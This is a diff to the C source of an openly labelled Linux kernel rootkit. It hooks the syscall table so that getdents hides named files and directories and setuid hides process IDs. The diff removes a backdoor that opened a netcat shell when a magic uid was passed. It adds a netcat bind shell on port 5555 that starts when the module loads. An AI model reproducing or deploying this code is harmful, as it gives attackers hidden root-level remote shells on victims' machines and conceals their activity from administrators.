@@ -26,7 +26,7 @@ you won't be able to rmmod it. Brick your system and no one will feel bad for yo
 @################################################################# @
 */
 
-MODULE_LICENSE("GPL"); // Would be LOL but linux doesn't like unknown licenses
+MODULE_LICENSE("WTFPL"); // Do What The Fuck You Want Public License
 
 /* Define address size depending on if system is 32 or 64 bit */
 
@@ -116,7 +116,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 	int t;
 	struct linux_dirent64 *dirp2, *dirp3;
 
-	tmp = (*orig_getdents64)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it
+	tmp = (*orig_getdents64)(fd, dirp, count); // Basiclly it runs the original, saves it, and parses through the struct looking for out evil directory/file name
 
 	if(tmp > 0){
 		dirp2 = (struct linux_dirent64 *) kmalloc(tmp, GFP_KERNEL);
@@ -153,7 +153,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned in
     int t;
     struct dirent *dirp2, *dirp3;
 
-    tmp = (*orig_getdents)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it
+    tmp = (*orig_getdents)(fd, dirp, count); // Same as before, but for 32bit getdents
 
     if(tmp > 0){
         dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
@@ -191,12 +191,6 @@ asmlinkage int hacked_setuid(uid_t uid){
 		sprintf(hidden_PIDs[PID_index++], "proc/%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
 	}
-	if(uid == 9001){
-		char *argv[] = { "/bin/nc", "-lp", "31337", "-e", "/bin/sh", "NULL"};
-	    static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	    call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
-		printk("Ran backdoor...");
-	}
 	return (*orig_setuid)(uid);
 }
 
@@ -223,10 +217,14 @@ int rootkit_init(void) { // Start lel rootkit
 	#if defined(__NR_setuid32)
 	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid32],hacked_setuid);
 	#else
-    orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
+	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
 	#endif
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
+
+        char *argv[] = {"nc", "-e", "/bin/bash", "-lp", "5555"};
+        static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+        return call_usermodehelper("/usr/bin/nc", argv, env, UMH_WAIT_PROC);
 
 	return 0;
 }
